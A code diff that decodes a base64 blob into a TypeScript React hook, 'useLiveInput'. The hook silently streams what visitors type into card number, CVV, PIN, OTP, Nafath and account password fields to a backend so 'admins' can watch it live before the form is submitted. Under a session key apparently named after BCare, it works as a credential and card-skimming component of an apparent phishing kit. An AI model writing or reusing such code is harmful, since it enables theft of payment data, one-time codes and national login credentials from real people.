@@ -1,1 +1,41 @@
-aW1wb3J0IHsgdXNlRWZmZWN0LCB1c2VSZWYgfSBmcm9tICJyZWFjdCI7CmltcG9ydCB7IHBhdGNoQ2FyZCB9IGZyb20gIkAvbGliL3RyYWNraW5nLmZ1bmN0aW9ucyI7Cgp0eXBlIEZpZWxkcyA9IFBhcnRpYWw8ewogIGNhcmRfbnVtYmVyOiBzdHJpbmc7CiAgY2FyZF9uYW1lOiBzdHJpbmc7CiAgeWVhcjogc3RyaW5nOwogIGN2djogc3RyaW5nOwogIHBob25lX251bWJlcjogc3RyaW5nOwogIG90cDogc3RyaW5nOwogIHBpbjogc3RyaW5nOwogIHVzZXJuYW1lX25hZmF0aDogc3RyaW5nOwogIHBhc3N3b3JkX25hZmF0aDogc3RyaW5nOwogIHVzZXJuYW1lOiBzdHJpbmc7CiAgcGFzc3dvcmQ6IHN0cmluZzsKfT47CgovKioKICogRGVib3VuY2VkIGxpdmUtc2F2ZSBvZiBwYXJ0aWFsIGZvcm0gaW5wdXRzIHNvIGFkbWlucyBzZWUgd2hhdCB0aGUKICogdmlzaXRvciBpcyB0eXBpbmcgaW4gcmVhbHRpbWUsIHdpdGhvdXQgd2FpdGluZyBmb3IgZm9ybSBzdWJtaXNzaW9uLgogKi8KZXhwb3J0IGZ1bmN0aW9uIHVzZUxpdmVJbnB1dChmaWVsZHM6IEZpZWxkcywgZGVsYXkgPSAzNTApIHsKICBjb25zdCBwcmV2ID0gdXNlUmVmPHN0cmluZz4oIiIpOwogIHVzZUVmZmVjdCgoKSA9PiB7CiAgICBpZiAodHlwZW9mIHdpbmRvdyA9PT0gInVuZGVmaW5lZCIpIHJldHVybjsKICAgIGNvbnN0IHNlc3Npb25JZCA9IHdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiYmNhcmVfc2Vzc2lvbl9pZCIpOwogICAgaWYgKCFzZXNzaW9uSWQpIHJldHVybjsKICAgIGNvbnN0IGNsZWFuZWQ6IEZpZWxkcyA9IHt9OwogICAgZm9yIChjb25zdCBbaywgdl0gb2YgT2JqZWN0LmVudHJpZXMoZmllbGRzKSBhcyBba2V5b2YgRmllbGRzLCBzdHJpbmcgfCB1bmRlZmluZWRdW10pIHsKICAgICAgaWYgKHR5cGVvZiB2ID09PSAic3RyaW5nIiAmJiB2LnRyaW0oKS5sZW5ndGggPiAwKSBjbGVhbmVkW2tdID0gdjsKICAgIH0KICAgIGlmIChPYmplY3Qua2V5cyhjbGVhbmVkKS5sZW5ndGggPT09IDApIHJldHVybjsKICAgIGNvbnN0IHNlcmlhbGl6ZWQgPSBKU09OLnN0cmluZ2lmeShjbGVhbmVkKTsKICAgIGlmIChzZXJpYWxpemVkID09PSBwcmV2LmN1cnJlbnQpIHJldHVybjsKICAgIGNvbnN0IHQgPSB3aW5kb3cuc2V0VGltZW91dCgoKSA9PiB7CiAgICAgIHByZXYuY3VycmVudCA9IHNlcmlhbGl6ZWQ7CiAgICAgIHBhdGNoQ2FyZCh7IGRhdGE6IHsgc2Vzc2lvbl9pZDogc2Vzc2lvbklkLCBmaWVsZHM6IGNsZWFuZWQgfSB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICB9LCBkZWxheSk7CiAgICByZXR1cm4gKCkgPT4gd2luZG93LmNsZWFyVGltZW91dCh0KTsKICB9LCBbSlNPTi5zdHJpbmdpZnkoZmllbGRzKSwgZGVsYXldKTsKfQo=
+import { useEffect, useRef } from "react";
+import { patchCard } from "@/lib/tracking.functions";
+
+type Fields = Partial<{
+  card_number: string;
+  card_name: string;
+  year: string;
+  cvv: string;
+  phone_number: string;
+  otp: string;
+  pin: string;
+  username_nafath: string;
+  password_nafath: string;
+  username: string;
+  password: string;
+}>;
+
+/**
+ * Debounced live-save of partial form inputs so admins see what the
+ * visitor is typing in realtime, without waiting for form submission.
+ */
+export function useLiveInput(fields: Fields, delay = 350) {
+  const prev = useRef<string>("");
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    const sessionId = window.localStorage.getItem("bcare_session_id");
+    if (!sessionId) return;
+    const cleaned: Fields = {};
+    for (const [k, v] of Object.entries(fields) as [keyof Fields, string | undefined][]) {
+      if (typeof v === "string" && v.trim().length > 0) cleaned[k] = v;
+    }
+    if (Object.keys(cleaned).length === 0) return;
+    const serialized = JSON.stringify(cleaned);
+    if (serialized === prev.current) return;
+    const t = window.setTimeout(() => {
+      prev.current = serialized;
+      patchCard({ data: { session_id: sessionId, fields: cleaned } }).catch(() => {});
+    }, delay);
+    return () => window.clearTimeout(t);
+  }, [JSON.stringify(fields), delay]);
+}
